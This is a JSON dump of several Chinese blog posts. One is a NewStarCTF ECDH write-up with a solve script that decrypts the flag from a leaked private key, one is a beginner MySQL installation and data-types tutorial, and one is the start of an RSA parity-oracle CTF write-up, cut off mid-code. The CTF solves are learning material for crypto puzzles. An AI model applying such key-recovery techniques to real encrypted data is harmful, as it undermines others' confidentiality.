[{"title":"ECDH-密码交换攻击","url":"/2023/03/11/ECDH/","content":"[NewStarCTF] Week 5 - An der schönen Elliptische KurveAnalyz先上题：\n#task.sagefrom secret import FLAG, ECDH_KEY_EXCHANGEfrom Crypto.Cipher import AESfrom hashlib import md5from os import urandomiv = urandom(16)a = 14489b = 10289p = 7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661F = GF(p)E = EllipticCurve(F, [a, b])G = E.random_point()my_private_key = random_prime(2^256)shared, sender_public_key = ECDH_KEY_EXCHANGE(G, my_private_key)key = md5(str(int(shared.xy()[0])).encode()).digest()cipher = AES.new(key, AES.MODE_CBC, iv)ciphretext = cipher.encrypt(FLAG)print(a)print(b)print(p)print(sender_public_key)print(my_private_key)print(ciphretext.hex())print(iv.hex())\n#output.txt14489102897486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661(1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207 : 1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459 : 1)25495456812197660236899774619860149159465038062538775349151750933063178527732f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23d151c04c645c3e2a8d3f1ae44589ef20\n浅分析一下task.sage，我们只有sender_public_key和my_private_key，显然考察的是ECDH\n\nECDH算法假设有两端，Alice和Bob，他们想在非安全信道上安全地交换信息但又不想被第三方获取，此时可以采用ECDH密钥交换算法\n双方都知道ECDH算法中的一个大素数p，还有一个整数g作为辅助\nAlice生成私钥a，并通过生成公钥。Bob生成私钥b，然后通过生成公钥B，在发送B之前，Bob通过生成公共密钥，但是只发送B，而Alice在接收到Bob的公钥B之后，同样可以通过来生成公共密钥K。\n\n攻击对于Alice和Bob来说，\n所以我们可以得出以下结论，\nEXP#Sagefrom hashlib import *from Crypto.Cipher import AESfrom Crypto.Util.number import *a=14489b=10289p=7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661#sender_public_key=(1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207 : 1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459 : 1)my_private_key=2549545681219766023689977461986014915946503806253877534915175093306317852773ciphertext=\"2f65ff4a97e0e05c06eab06b58ea38a3d5b6d2a65ea4907bc46493b30081a211d7cffc872a23dbd565ef307f9492bb23\"iv=\"d151c04c645c3e2a8d3f1ae44589ef20\"F=GF(p)E=EllipticCurve(F,[a,b])sender_public_key=E([1285788649714386836892440333012889444698233333809489364474616947934542770724999997145538088456652601147045234490019282952264340541239682982255115303711207,1081635450946385063319483423983665253792071829707039194609541132041775615770167048603029155228167113450196436786905820356216200242445665942628721193713459])shared=sender_public_key*my_private_keykey = md5(str(int(shared.xy()[0])).encode()).digest()#iv=int(iv,16)iv=bytes.fromhex(iv)#ciphertext=int(ciphertext,16)ciphertext=bytes.fromhex(ciphertext)cipher=AES.new(key,AES.MODE_CBC,iv)cipher=cipher.decrypt(ciphertext)print(cipher)\n","categories":["CTF"],"tags":["CTF","CRYPTO","ECC","ECDH"]},{"title":"初见MySQL——基础篇","url":"/2023/03/09/MySQL_1/","content":"初见MySQL——基础篇1.安装MySQL（zip archive）windows环境下不推荐用安装包安装，之后清理注册表比较麻烦\nzip archive website:https://dev.mysql.com/downloads/mysql/\n解压之后在文件夹里新建一个my.ini作为配置文件（新版本不自带这个）\n#my.ini[mysql]# 设置mysql客户端默认字符集default-character-set=utf8mb4[mysqld]#设置3306端口port = 3306# 设置mysql的安装目录basedir=D:\\mysql\\mysql-8.0.32-winx64# 设置mysql数据库的数据的存放目录datadir=D:\\mysql\\data # 允许最大连接数max_connections=200# 服务端使用的字符集默认为UTF8character-set-server=utf8mb4# utf8bm4即utf-8# 创建新表时将使用的默认存储引擎\n其中basedir和datadir需要根据解压目录和数据存放地址进行修改，建议在mysql-8.0.32-winx64同级新建一个data文件夹用于存放数据\n以管理员身份运行cmd命令，并切换到安装目录下的bin下\n初始化MySQL：\nmysqld --initialize --console#Expected output:#2023-03-06T04:35:17.961027Z 0 [System] [MY-013169] [Server] D:\\mysql\\mysql-8.0.32-winx64\\bin\\mysqld.exe (mysqld 8.0.32) #initializing of server in progress as process 23832#2023-03-06T04:35:17.979526Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.#2023-03-06T04:35:18.172968Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.#2023-03-06T04:35:18.707708Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: ************#Possible errors:#如果执行后报错：无法启动此程序，因为计算机中丢失VCRUNTIME140_1.dll，尝试重新安装此程序以解决此问题#Tips:#*号处是初始密码，需要保存下来\n安装MySQL：\nmysqld --install#Expected output:#Service successfully installed.\n登录数据库：\nmysql -u root -p#Expected output:#Enter password: ************#Welcome to the MySQL monitor.  Commands end with ; or \\g.#Your MySQL connection id is 9#Server version: 8.0.32#Possible errors:#ERROR 2003 (HY000): Can&#x27;t connect to MySQL server on &#x27;localhost:3306&#x27; (10061)#MySQL服务未开启#win+r,输入&quot;services.msc&quot;#找到&quot;MYSQL&quot;,右键选择&quot;属性&quot;,将&quot;启动类型&quot;改为&quot;自动&quot;,点击&quot;服务状态&quot;中的&quot;启动&quot;即可#ERROR 1045 (28000): Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: NO)#密码输错了，记得是初始密码\n修改初始密码：\nALTER USER root@localhost IDENTIFIED BY &#x27;********&#x27;;#Expected output:#Query OK, 0 rows affected (0.02 sec)\n2.MySQL基础操作2.1 查看数据库SQL是一种语言\nSQL是一种语言\nSQL是一种语言\n一定不能忘记加分号，分号说明这条语句结束，每个单词之间记得空格，这里展示所有的数据库，base后面记得加s，ctrl + c可以终止当前输入，mysql中不区分大小写，如果出现以下情况，说明语句未结束，可能是漏了分号\nmysql&gt; show database    -&gt; \n#Expected output:mysql&gt; show databases;#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| sys                |#+--------------------+#4 rows in set (0.01 sec)\n\n2.2 建立数据库create database test1;\n#Expected output:#Query OK, 1 row affected (0.01 sec)mysql&gt; show databases;#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| performance_schema |#| sys                |#| test1              |#+--------------------+#5 rows in set (0.00 sec)\n\n2.3 数据库语句分类2.3.1 DQL（数据查询语言）数据查询语言（Data Query Language, DQL）是SQL语言中，负责进行数据查询而不会对数据本身进行修改的语句，这是最基本的SQL语句。\n#我们在看到select…这样的sql语句，都是数据查询语句，凡是带有select关键字的SQL语句都是DQL语句\n2.3.2 DML（数据操纵语言）  数据操纵语言（Data Manipulation Language, DML）是SQL语言中，负责对数据库对象运行数据访问工作的指令集，以INSERT、UPDATE、DELETE三种指令为核心，分别代表插入、更新与删除。\n#凡是带有INSERT、UPDATE、DELETE关键字的语句都是DML#insert —— 插入，等同于增#update —— 更新，等同修改#delete —— 删除\n​    这个主要操作的是表中的数据\n2.3.3 DDL（数据定义语言）  数据定义语言 (Data Definition Language, DDL) 是SQL语言集中，负责数据结构定义与数据库对象定义的语言，由creat、alter 与 drop 三个语法所组成. DDL 主要操作的是 表的结构 不是表中的数据\n#凡是带有 create（增）、alter（改）、drop（删）关键字的语句都是DDL#create —— 新建、等同于增#drop —— 删除#alter —— 修改\n​    这个增删改与 DML 有所不同，这个主要是对表结构进行操作.\n2.3.4 DCL（数据控制语言）  数据控制语言 (Data Control Language) 在SQL语言中，是一种可对数据访问权进行控制的指令，它可以控制特定用户账户对数据表、查看表、预存程序、用户自定义函数等数据库对象的控制权。对数据的权限进行控制的语言.\n#请求授权—— grant#撤销授权 —— revoke\n2.3.5 TCL（事务处理语言）  这里的TCL可不是王牌电视，事务处理语言(Transaction Control Language),它的语句能确保被DML语句影响的表的所有行及时得以更新。是一种事务控制语言。\n#事务提交 —— commit#事务回滚 —— rollback\n\n2.4 数据库的分类2.4.1 关系型数据库Mysql、Sql server、Oracle 、SqLite属于关系型数据库\n把数据按照 表 的形式来进行组织（类似于Excel这种形式的），关系型数据库能够对数据进行更严格的校验，带来更好的数据的完整性\n2.4.2 非关系型数据库Redis、HBase 、MongoDB属于非关系型数据库\n把数据按照 文档 的形式来进行组织，文档和文档之间的差别可以较大，更灵活的组织数据，效率更高，更容易在分布式环境下使用\n\n2.5 什么是表表是组织数据的一种形式，类似于Excel中的表格\n数据库中是以 表格的形式来表示数据的，因为表格比较直观，任何表都有行和列\n行（row）: 被称为数据/ 记录\n列（column）: 被称为字段\n每个字段都有字段名、数据类型、约束条件等属性\n字段名：只是一个普通的名字，见名知意就行了\n数据类型： 字符串类型，数字、日期等类型，在后面我们会详细介绍\n约束：约束也有很多，其中有一个叫做唯一性约束，这种约束添加后，该字段的数据不能重复\n2.5.1 查看数据库中的表use test1;\n#Expected output:#Database changed\nshow tables;\n#Expected output:#+--------------------+#| Database in test1  |#+--------------------+#| article            |#| res                |#| name               |#+--------------------+#3 rows in set (0.00 sec)\n\n2.6 数据库操作2.6.1 显示当前的数据库show databases;\n#Expected output:#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| sys                |#+--------------------+#4 rows in set (0.01 sec)\n2.6.2 创建数据库create database [name];\n#Expected output:#Query OK, 1 row affected (0.01 sec)mysql&gt; show databases;#+--------------------+#| Database           |#+--------------------+#| information_schema |#| mysql              |#| performance_schema |#| sys                |#| name               |#+--------------------+#5 rows in set (0.00 sec)\n语法：\nCREATE DATABASE [IF NOT EXISTS] db_name [create_specification] [,create_specification] ...]create_specification:\t[DEFAULT] CHARACTER SET charset_name\t[DEFAULT] COLLATE collation_name#大写的表示是关键字#[]是可选项#CHARACTER SET：指定数据库采用的字符集#COLLATE：指定数据库字符集的校验规则\n2.6.3 选中/使用数据库use [name];\n#Expected output:#Database changed\n2.6.4 删除数据库drop database [name];\n语法：\nDROP DATABASE [IF EXISTS] db_name\n#Expected output:#Query OK, 0 row affected (0.00 sec)\n 一旦删除数据库，这里的数据通过常规的手段就找不回来了！！！所以删除数据库是一个非常危险的操作！！在工作中，无论如何都不要使用drop database操作，尤其是针对线上环境~\n2.7 数据类型数据类型（data_type）是指系统中所允许的数据的类型。数据库中的每个列都应该有适当的数据类型，用于限制或允许该列中存储的数据。例如，列中存储的为数字，则相应的数据类型应该为数值类型。\n如果使用错误的数据类型可能会严重影响应用程序的功能和性能，所以在设计表时，应该特别重视数据列所用的数据类型。更改包含数据的列不是一件小事，这样做可能会导致数据丢失。因此，在创建表时必须为每个列设置正确的数据类型和长度。\nMySQL 的数据类型有大概可以分为整数类型、浮点数类型和定点数类型、日期和时间类型、字符串类型、二进制类型等。\n注意： 整数类型和浮点数类型可以统称为数值数据类型。\n\n数值类型：整数类型包括 TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT，浮点数类型包括 FLOAT 和 DOUBLE，定点数类型为 DECIMAL。\n日期/时间类型：包括 YEAR、TIME、DATE、DATETIME 和 TIMESTAMP。\n字符串类型：包括 CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM 和 SET 等。\n二进制类型：包括 BIT、BINARY、VARBINARY、TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。\n\n\n2.7.1 数值类型整数类型MySQL 主要提供的整数类型有 TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT，其属性字段可以添加 AUTO_INCREMENT 自增约束条件。\n\n从上表中可以看到，不同类型的整数存储所需的字节数不相同，占用字节数最小的是 TINYINT 类型，占用字节最大的是 BIGINT 类型，占用的字节越多的类型所能表示的数值范围越大。\n根据占用字节数可以求出每一种数据类型的取值范围。例如，TINYINT 需要 1 个字节（8bit）来存储，那么 TINYINT 无符号数的最大值为 28-1，即 255；TINYINT 有符号数的最大值为 27-1，即 127。其他类型的整数的取值范围计算方法相同，如下表所示。\n\n提示： 显示宽度和数据类型的取值范围是无关的。显示宽度只是指明 MySQL 最大可能显示的数字个数，数值的位数小于指定的宽度时会由空格填充。如果插入了大于显示宽度的值，只要该值不超过该类型整数的取值范围，数值依然可以插入，而且能够显示出来。例如，year 字段插入 19999，当使用 SELECT 查询该列值的时候，MySQL 显示的将是完整的带有 5 位数字的 19999，而不是 4 位数字的值。\n其他整型数据类型也可以在定义表结构时指定所需的显示宽度，如果不指定，则系统为每一种类型指定默认的宽度值。\n不同的整数类型有不同的取值范围，并且需要不同的存储空间，因此应根据实际需要选择最合适的类型，这样有利于提高查询的效率和节省存储空间。\n浮点类型MySQL 中使用浮点数和定点数来表示小数。\n浮点类型有两种，分别是单精度浮点数（FLOAT）和双精度浮点数（DOUBLE）；定点类型只有一种，就是 DECIMAL。\n浮点类型和定点类型都可以用(M, D)来表示，其中 M 称为精度，表示总共的位数；D 称为标度，表示小数的位数。\n浮点数类型的取值范围为 M（1～255）和 D（1～30，且不能大于 M-2），分别表示显示宽度和小数位数。M 和 D 在 FLOAT 和DOUBLE 中是可选的，FLOAT 和 DOUBLE 类型将被保存为硬件所支持的最大精度。DECIMAL 的默认 D 值为 0、M 值为 10。\n下表中列出了 MySQL 中的小数类型和存储需求。\n\nDECIMAL 类型不同于 FLOAT 和 DOUBLE。DOUBLE 实际上是以字符串的形式存放的，DECIMAL 可能的最大取值范围与 DOUBLE 相同，但是有效的取值范围由 M 和 D 决定。如果改变 M 而固定 D，则取值范围将随 M 的变大而变大。\n从上表中可以看到，DECIMAL 的存储空间并不是固定的，而由精度值 M 决定，占用 M+2 个字节。\nFLOAT 类型的取值范围如下：\n\n有符号的取值范围：-3.402823466E+38～-1.175494351E-38。\n无符号的取值范围：0 和 -1.175494351E-38～-3.402823466E+38。\n\nDOUBLE 类型的取值范围如下：\n\n有符号的取值范围：-1.7976931348623157E+308～-2.2250738585072014E-308。\n无符号的取值范围：0 和 -2.2250738585072014E-308～-1.7976931348623157E+308。\n\n提示：\n\n不论是定点还是浮点类型，如果用户指定的精度超出精度范围，则会四舍五入进行处理。\nFLOAT 和 DOUBLE 在不指定精度时，默认会按照实际的精度（由计算机硬件和操作系统决定），DECIMAL 如果不指定精度，默认为（10，0）。\n浮点数相对于定点数的优点是在长度一定的情况下，浮点数能够表示更大的范围；缺点是会引起精度问题。\n在 MySQL 中，定点数以字符串形式存储，在对精度要求比较高的时候（如货币、科学数据），使用 DECIMAL 的类型比较好\n另外两个浮点数进行减法和比较运算时也容易出问题，所以在使用浮点数时需要注意，并尽量避免做浮点数比较。\n\n\n2.7.2 日期和时间类型MySQL 中有多处表示日期的数据类型：YEAR、TIME、DATE、DTAETIME、TIMESTAMP。当只记录年信息的时候，可以只使用 YEAR 类型。\n每一个类型都有合法的取值范围，当指定确定不合法的值时，系统将“零”值插入数据库中。\n\nYEAR 类型YEAR 类型是一个单字节类型，用于表示年，在存储时只需要 1 个字节。可以使用各种格式指定 YEAR，如下所示：\n\n以 4 位字符串或者 4 位数字格式表示的 YEAR，范围为 ‘1901’～’2155’。输入格式为 ‘YYYY’ 或者 YYYY，例如，输入 ‘2010’ 或 2010，插入数据库的值均为 2010。\n以 2 位字符串格式表示的 YEAR，范围为 ‘00’ 到 ‘99’。’00’～’69’ 和 ‘70’～’99’ 范围的值分别被转换为 2000～2069 和 1970～1999 范围的 YEAR 值。’0’ 与 ‘00’ 的作用相同。插入超过取值范围的值将被转换为 2000。\n以 2 位数字表示的 YEAR，范围为 1～99。1～99 和 70～99 范围的值分别被转换为 2001～2069 和 1970～1999 范围的 YEAR 值。注意，在这里 0 值将被转换为 0000，而不是 2000。\n\n提示： 两位整数范围与两位字符串范围稍有不同。例如，插入 3000 年，读者可能会使用数字格式的 0 表示 YEAR，实际上，插入数据库的值为 0000，而不是所希望的 3000。只有使用字符串格式的 ‘0’ 或 ‘00’，才可以被正确解释为 3000，非法 YEAR值将被转换为 0000。\nTIME 类型TIME 类型用于只需要时间信息的值，在存储时需要 3 个字节。格式为 HH:MM:SS。HH 表示小时，MM 表示分钟，SS 表示秒。\nTIME 类型的取值范围为 -838：59：59～838：59：59，小时部分如此大的原因是 TIME 类型不仅可以用于表示一天的时间（必须小于 24 小时），还可能是某个事件过去的时间或两个事件之间的时间间隔（可大于 24 小时，或者甚至为负）。\n可以使用各种格式指定 TIME 值，如下所示。\n\n‘D HH：MM：SS‘ 格式的字符串。还可以使用这些“非严格”的语法：’HH：MM：SS‘、’HH：MM‘、’D HH‘ 或 ‘SS‘。这里的 D 表示日，可以取 0～34 之间的值。在插入数据库时，D 被转换为小时保存，格式为 “D*24+HH”。\n‘HHMMSS‘ 格式、没有间隔符的字符串或者 HHMMSS 格式的数值，假定是有意义的时间。例如，’101112’ 被理解为’10：11：12’，但是 ‘106112’ 是不合法的（它有一个没有意义的分钟部分），在存储时将变为 00：00：00。\n\n为 TIME 列分配简写值时应注意：\n\n如果没有冒号，MySQL 解释值时，假定最右边的两位表示秒。（MySQL 解释 TIME 值为过去的时间而不是当前的时间）。例如，读者可能认为 ‘1112’ 和 1112 表示 11：12：00（即 11 点过 12 分钟），但MySQL 将它们解释为 00：11：12（即 11 分 12 秒）。同样 ‘12’ 和 12 被解释为00：00：12。\n相反，TIME 值中如果使用冒号则肯定被看作当天的时间，也就是说，’11：12’ 表示 11：12：00，而不是 00：11：12。\n\nDATE 类型DATE 类型用于仅需要日期值时，没有时间部分，在存储时需要 3 个字节。日期格式为 ‘YYYY-MM-DD‘，其中 YYYY 表示年，MM 表示月，DD 表示日。\n在给 DATE 类型的字段赋值时，可以使用字符串类型或者数字类型的数据插入，只要符合 DATE 的日期格式即可。如下所示：\n\n以 ‘YYYY-MM-DD‘ 或者 ‘YYYYMMDD‘ 字符中格式表示的日期，取值范围为 ‘1000-01-01’～’9999-12-3’。例如，输入 ‘2015-12-31’ 或者 ‘20151231’，插入数据库的日期为2015-12-31。\n以 ‘YY-MM-DD‘ 或者 ‘YYMMDD‘ 字符串格式表示日期，在这里YY表示两位的年值。MySQL 解释两位年值的规则：’00～69’ 范围的年值转换为 ‘2000-2069’，’70-99’ 范围的年值转换为 ‘1970～1999’。例如，输入 ‘15-12-31’，插入数据库的日期为 2015-12-31；输入 ‘991231’，插入数据库的日期为 1999-12-31。\n以YYMMDD 数字格式表示的日期，与前面相似，00~69 范围的年值转换为 2000～2069，80～99 范围的年值转换为 1980～1999。例如，输入 151231，插入数据库的日期为 2015-12-31，输入 991231，插入数据库的日期为 1999-12-31。\n使用 CURRENT_DATE 或者 NOW()，插入当前系统日期。\n\nMySQL 允许“不严格”语法： 任何标点符号都可以用作日期部分之间的间隔符。例如，’98-11-31’、’98.11.31’、’98/11/31’和’98@11@31’ 是等价的，这些值也可以正确地插入数据库。\nDATETIME 类型DATETIME 类型用于需要同时包含日期和时间信息的值，在存储时需要 8 个字节。日期格式为 ‘YYYY-MM-DD HH：MM：SS‘，其中 YYYY 表示年，MM 表示月，DD 表示日，HH 表示小时，MM 表示分钟，SS 表示秒。\n在给 DATETIME 类型的字段赋值时，可以使用字符串类型或者数字类型的数据插入，只要符合 DATETIME 的日期格式即可，如下所示。\n\n以 ‘YYYY-MM-DD HH：MM：SS‘ 或者 ‘YYYYMMDDHHMMSS‘ 字符串格式表示的日期，取值范围为 ‘1000-01-01 00：00：00’～’9999-12-3 23：59：59’。例如，输入 ‘2014-12-31 05：05：05’ 或者 ‘20141231050505’，插入数据库的 DATETIME 值都为 2014-12-31 05：05：05。\n以 ‘YY-MM-DD HH：MM：SS‘ 或者 ‘YYMMDDHHMMSS‘ 字符串格式表示的日期，在这里 YY 表示两位的年值。与前面相同，’00～79’ 范围的年值转换为 ‘2000～2079’，’80～99’ 范围的年值转换为 ‘1980～1999’。例如，输入 ‘14-12-31 05：05：05’，插入数据库的 DATETIME 为 2014-12-31 05：05：05；输入 141231050505，插入数据库的 DATETIME 为 2014-12-31 05：05：05。\n以 YYYYMMDDHHMMSS 或者 YYMMDDHHMMSS 数字格式表示的日期和时间。例如，输入 20141231050505，插入数据库的 DATETIME 为 2014-12-31 05：05：05；输入 140505050505，插入数据库的 DATETIME 为 2014-12-31 05：05：05。\n\nMySQL 允许“不严格”语法： 任何标点符号都可用作日期部分或时间部分之间的间隔符。例如，’98-12-31 11：30：45’、’98.12.31 11+30+35’、’98/12/31 113045’ 和 ‘98@12@31 11^30^45’ 是等价的，这些值都可以正确地插入数据库。\nTIMESTAMP 类型TIMESTAMP 的显示格式与 DATETIME 相同，显示宽度固定在 19 个字符，日期格式为 YYYY-MM-DD HH：MM：SS，在存储时需要 4 个字节。但是 TIMESTAMP 列的取值范围小于 DATETIME 的取值范围，为 ‘1970-01-01 00：00：01’UTC～’2038-01-19 03：14：07’UTC。在插入数据时，要保证在合法的取值范围内。\n提示： 协调世界时（英：Coordinated Universal Time，法：Temps Universel Coordonné）又称为世界统一时间、世界标准时间、国际协调时间。英文（CUT）和法文（TUC）的缩写不同，作为妥协，简称 UTC。\nTIMESTAMP 与 DATETIME 除了存储字节和支持的范围不同外，还有一个最大的区别是：\n\nDATETIME 在存储日期数据时，按实际输入的格式存储，即输入什么就存储什么，与时区无关；\n而 TIMESTAMP 值的存储是以 UTC（世界标准时间）格式保存的，存储时对当前时区进行转换，检索时再转换回当前时区。即查询时，根据当前时区的不同，显示的时间值是不同的。\n\n提示： 如果为一个 DATETIME 或 TIMESTAMP 对象分配一个 DATE 值，结果值的时间部分被设置为 ‘00：00：00’，因此 DATE 值未包含时间信息。如果为一个 DATE 对象分配一个 DATETIME 或 TIMESTAMP 值，结果值的时间部分被删除，因此DATE 值未包含时间信息。\n\n2.7.3 字符串类型字符串类型用来存储字符串数据，还可以存储图片和声音的二进制数据。字符串可以区分或者不区分大小写的串比较，还可以进行正则表达式的匹配查找。\nMySQL 中的字符串类型有 CHAR、VARCHAR、TINYTEXT、TEXT、MEDIUMTEXT、LONGTEXT、ENUM、SET 等。\n下表中列出了 MySQL 中的字符串数据类型，括号中的 M 表示可以为其指定长度。\n\nVARCHAR 和 TEXT 类型是变长类型，其存储需求取决于列值的实际长度（在前面的表格中用 L 表示），而不是取决于类型的最大可能尺寸。\n例如，一个 VARCHAR(10) 列能保存一个最大长度为 10 个字符的字符串，实际的存储需要字符串的长度 L 加上一个字节以记录字符串的长度。对于字符 “abcd”，L 是 4，而存储要求 5 个字节。\nCHAR 和 VARCHAR 类型CHAR(M) 为固定长度字符串，在定义时指定字符串列长。当保存时，在右侧填充空格以达到指定的长度。M 表示列的长度，范围是 0～255 个字符。\n例如，CHAR(4) 定义了一个固定长度的字符串列，包含的字符个数最大为 4。当检索到 CHAR 值时，尾部的空格将被删除。\nVARCHAR(M) 是长度可变的字符串，M 表示最大列的长度，M 的范围是 0～65535。VARCHAR 的最大实际长度由最长的行的大小和使用的字符集确定，而实际占用的空间为字符串的实际长度加 1。\n例如，VARCHAR(50) 定义了一个最大长度为 50 的字符串，如果插入的字符串只有 10 个字符，则实际存储的字符串为 10 个字符和一个字符串结束字符。VARCHAR 在值保存和检索时尾部的空格仍保留。\n实例： 下面将不同的字符串保存到 CHAR(4) 和 VARCHAR(4) 列，说明 CHAR 和 VARCHAR 之间的差别，如下表所示。\n\n对比结果可以看到，CHAR(4) 定义了固定长度为 4 的列，无论存入的数据长度为多少，所占用的空间均为 4 个字节。VARCHAR(4) 定义的列所占的字节数为实际长度加 1。\nTEXT 类型TEXT 列保存非二进制字符串，如文章内容、评论等。当保存或查询 TEXT 列的值时，不删除尾部空格。\nTEXT 类型分为 4 种：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。不同的 TEXT 类型的存储空间和数据长度不同。\n\nTINYTEXT 表示长度为 255字符的 TEXT 列。\nTEXT 表示长度为 65535字符的 TEXT 列。\nMEDIUMTEXT 表示长度为 16777215字符的 TEXT 列。\nLONGTEXT 表示长度为 4294967295 或 4GB 字符的 TEXT 列。\n\nENUM 类型ENUM 是一个字符串对象，值为表创建时列规定中枚举的一列值。其语法格式如下：\n&lt;字段名&gt; ENUM( &#x27;值1&#x27;, &#x27;值1&#x27;, …, &#x27;值n&#x27; )\n字段名指将要定义的字段，值 n 指枚举列表中第 n 个值。\nENUM 类型的字段在取值时，能在指定的枚举列表中获取，而且一次只能取一个。如果创建的成员中有空格，尾部的空格将自动被删除。\nENUM 值在内部用整数表示，每个枚举值均有一个索引值；列表值所允许的成员值从 1 开始编号，MySQL 存储的就是这个索引编号，枚举最多可以有 65535 个元素。\n例如，定义 ENUM 类型的列（’first’，’second’，’third’），该列可以取的值和每个值的索引如下表所示。\n\nENUM 值依照列索引顺序排列，并且空字符串排在非空字符串前，NULL 值排在其他所有枚举值前。\n提示： ENUM 列总有一个默认值。如果将 ENUM 列声明为 NULL，NULL 值则为该列的一个有效值，并且默认值为 NULL。如果 ENUM 列被声明为 NOT NULL，其默认值为允许的值列表的第 1 个元素。\nSET 类型SET 是一个字符串的对象，可以有零或多个值，SET 列最多可以有 64 个成员，值为表创建时规定的一列值。指定包括多个 SET 成员的 SET 列值时，各成员之间用逗号,隔开，语法格式如下：\nSET( &#x27;值1&#x27;, &#x27;值2&#x27;, …, &#x27;值n&#x27; )\n与 ENUM 类型相同，SET 值在内部用整数表示，列表中每个值都有一个索引编号。当创建表时，SET 成员值的尾部空格将自动删除。\n但与 ENUM 类型不同的是，ENUM 类型的字段只能从定义的列值中选择一个值插入，而 SET 类型的列可从定义的列值中选择多个字符的联合。\n提示： 如果插入 SET 字段中的列值有重复，则 MySQL 自动删除重复的值；插入 SET 字段的值的顺序并不重要，MySQL 会在存入数据库时，按照定义的顺序显示；如果插入了不正确的值，默认情况下，MySQL 将忽视这些值，给出警告。\n\n2.7.4 二进制类型MySQL 支持两类字符型数据：文本字符串和二进制字符串。二进制字符串类型有时候也直接被称为“二进制类型”。\nMySQL 中的二进制字符串有 BIT、BINARY、VARBINARY、TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。\n下表中列出了 MySQL 中的二进制数据类型，括号中的 M 表示可以为其指定长度。\n\nBIT 类型位字段类型。M 表示每个值的位数，范围为 1～64。如果 M 被省略，默认值为 1。如果为 BIT(M) 列分配的值的长度小于 M 位，在值的左边用 0 填充。例如，为 BIT(6) 列分配一个值 b’101’，其效果与分配 b’000101’ 相同。\nBIT 数据类型用来保存位字段值，例如以二进制的形式保存数据 13，13 的二进制形式为 1101，在这里需要位数至少为 4 位的 BIT 类型，即可以定义列类型为 BIT(4)。大于二进制 1111 的数据是不能插入BIT(4) 类型的字段中的。\n提示： 默认情况下，MySQL 不可以插入超出该列允许范围的值，因而插入数据时要确保插入的值在指定的范围内。\nBINARY 和 VARBINARY 类型BINARY 和 VARBINARY 类型类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字节字符串。使用的语法格式如下：\n列名称 BINARY(M) 或者 VARBINARY(M)\nBINARY 类型的长度是固定的，指定长度后，不足最大长度的，将在它们右边填充 “\\0” 补齐，以达到指定长度。例如，指定列数据类型为 BINARY(3)，当插入 a 时，存储的内容实际为 “\\a0\\0”，当插入 ab 时，实际存储的内容为“ab\\0”，无论存储的内容是否达到指定的长度，存储空间均为指定的值 M。\nVARBINARY 类型的长度是可变的，指定好长度之后，长度可以在 0 到最大值之间。例如，指定列数据类型为 VARBINARY(20)，如果插入的值长度只有 10，则实际存储空间为 10 加 1，实际占用的空间为字符串的实际长度加 1。\nBLOB 类型BLOB 是一个二进制的对象，用来存储可变数量的数据。BLOB 类型分为 4 种：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB，它们可容纳值的最大长度不同，如下表所示。\n\n\nBLOB 列存储的是二进制字符串（字节字符串），TEXT 列存储的是非进制字符串（字符字符串）。\nBLOB 列是字符集，并且排序和比较基于列值字节的数值；TEXT 列有一个字符集，并且根据字符集对值进行排序和比较。\n\n\n2.7.5 Linkhttps://mp.weixin.qq.com/s?__biz=MzA5NzQxOTE4NA==&amp;mid=2247484005&amp;idx=1&amp;sn=9cfc06b6605cfc10056971a745e400e2&amp;chksm=90a068baa7d7e1ac5f14f0b42d54ebb8effc1b1e9bb6035f22ea1eb6d2ad2dcfd35fc6323e0b&amp;scene=27\n2.8 表的操作需要操作数据库中的表时，需要先使用该数据库\nuse db_test;\n2.8.1 查看表结构desc [name]\n表结构的具体解释：\n\n2.8.2 创建表create table table_name(datatype1,datatype2,...);\n2.8.3 删除表drop table table_name;\n语法：\nDROP [TEMPORARY] TABLE [IF EXISTS] tbl_name [, tbl_name] ...\n","categories":["MySQL"],"tags":["MySQL"]},{"title":"Parity_RSA 二分法攻击","url":"/2022/03/10/Parity/","content":"Parity_RSA[QCTF] baby_rsa\nAnalyze先看题：\nimport socketserverfrom secret import flagimport signalfrom Crypto.Util.number import *import randomimport stringfrom hashlib import sha256table = string.ascii_letters + string.digitsmenu = b'''Give me your information and I'll tell you about the parity after decryption.Let me see your options...1.encrypt message2.get flag3.exit'''e = 0x10001p = getPrime(512)q = getPrime(512)N = p * qphi = (p - 1) * (q - 1)d = inverse(e, phi)class Task(socketserver.BaseRequestHandler):    def _recvall(self):        BUFF_SIZE = 2048        data = b''        while True:            part = self.request.recv(BUFF_SIZE)            data += part            if len(part) &lt; BUFF_SIZE:                break        return data.strip()    def send(self, msg, newline=True):        try:            if newline:                msg += b'\\n'            self.request.sendall(msg)        except:            pass    def recv(self, prompt=b'[-] '):        self.send(prompt, newline=False)        return self._recvall()    def proof_of_work(self):        proof = (''.join([random.choice(table) for _ in range(12)])).encode()        sha = sha256(proof).hexdigest().encode()        self.send(b\"[+] sha256(XXXX+\" + proof[4:] + b\") == \" + sha)        XXXX = 